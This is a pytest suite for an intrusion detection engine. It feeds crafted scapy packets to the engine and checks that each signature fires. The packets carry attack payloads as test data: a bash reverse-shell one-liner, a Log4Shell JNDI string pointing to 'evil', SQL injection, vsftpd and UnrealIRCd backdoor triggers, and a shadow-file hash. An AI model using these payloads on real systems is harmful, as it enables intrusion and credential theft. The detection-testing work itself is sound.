"""Unit + integration tests for sentinel-ids. Run: .venv/bin/python -m pytest -q"""
import subprocess, sys, json
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Raw
from ids.alerts import AlertBus
from ids.engine import Engine
from ids.packet import parse, decode_flags

ATT, TGT = "192.168.0.50", "192.168.0.166"

def eth(p): return Ether()/p

def run(packets, rules="rules/signatures.yaml"):
    bus = AlertBus(); eng = Engine(bus, rules_path=rules)
    fired = []
    t = 1_700_000_000.0
    for i, p in enumerate(packets):
        p.time = t + i*0.01
        fired += eng.process(p)
    return fired

def sids(alerts): return {a.sid for a in alerts}

def test_flag_decode():
    assert decode_flags(0x02) == "S"
    assert decode_flags(0x29) == "FPU"

def test_parse_tcp():
    r = parse(eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=22,flags="S")))
    assert r.proto=="TCP" and r.dst_port==22 and r.tcp_flags=="S"

def test_port_scan():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=40000+i,dport=p,flags="S"))
        for i,p in enumerate(range(1,21))]
    assert 1000001 in sids(run(pk))

def test_stealth_xmas():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=80,flags="FPU"))]
    assert 1000002 in sids(run(pk))

def test_host_sweep():
    pk=[eth(IP(src=ATT,dst=f"192.168.0.{h}")/ICMP(type=8)) for h in range(10,25)]
    assert 1000003 in sids(run(pk))

def test_syn_flood():
    pk=[eth(IP(src=f"10.0.0.{i%254+1}",dst=TGT)/TCP(sport=1024+i,dport=80,flags="S"))
        for i in range(220)]
    assert 1000004 in sids(run(pk))

def test_arp_spoof():
    pk=[eth(ARP(op=2,psrc="192.168.0.1",hwsrc="aa:aa:aa:aa:aa:aa",pdst=TGT)),
        eth(ARP(op=2,psrc="192.168.0.1",hwsrc="bb:bb:bb:bb:bb:bb",pdst=TGT))]
    assert 1000005 in sids(run(pk))

def test_brute_force():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=41000+i,dport=22,flags="S")) for i in range(30)]
    assert 1000006 in sids(run(pk))

def test_icmp_tunnel():
    pk=[eth(IP(src=ATT,dst=TGT)/ICMP(type=8)/Raw(load=b"X"*400))]
    assert 1000007 in sids(run(pk))

def test_sql_injection():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=80,flags="PA")/
        Raw(load=b"GET /?id=1 UNION SELECT password FROM users HTTP/1.1\r\n\r\n"))]
    assert 2000001 in sids(run(pk))

def test_log4shell():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=8080,flags="PA")/
        Raw(load=b"X: ${jndi:ldap://evil/a}\r\n\r\n"))]
    assert 2000005 in sids(run(pk))

def test_reverse_shell():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=4444,flags="PA")/
        Raw(load=b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))]
    assert 2002001 in sids(run(pk))

def test_vsftpd_backdoor():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=21,flags="PA")/
        Raw(load=b"USER pwn:)\r\n"))]
    assert 2003001 in sids(run(pk))

def test_unrealircd_backdoor():
    pk=[eth(IP(src=ATT,dst=TGT)/TCP(sport=1,dport=6667,flags="PA")/
        Raw(load=b"AB;id > /tmp/x\r\n"))]
    assert 2003002 in sids(run(pk))

def test_root_shell_observed():
    pk=[eth(IP(src=TGT,dst=ATT)/TCP(sport=1524,dport=1,flags="PA")/
        Raw(load=b"uid=0(root) gid=0(root) groups=0(root)\n"))]
    assert 2003003 in sids(run(pk))

def test_shadow_exfil():
    pk=[eth(IP(src=TGT,dst=ATT)/TCP(sport=6200,dport=1,flags="PA")/
        Raw(load=b"root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::"))]
    assert 2003004 in sids(run(pk))

def test_benign_no_false_positive():
    pk=[]
    for i in range(30):
        pk.append(eth(IP(src=TGT,dst="93.184.216.34")/TCP(sport=50000+i,dport=443,flags="PA")/
                   Raw(load=b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")))
    # a normal 3-way handshake to one port, repeated, must not scan-alert
    for i in range(5):
        pk.append(eth(IP(src=TGT,dst="8.8.8.8")/TCP(sport=60000+i,dport=443,flags="SA")))
    assert run(pk) == []
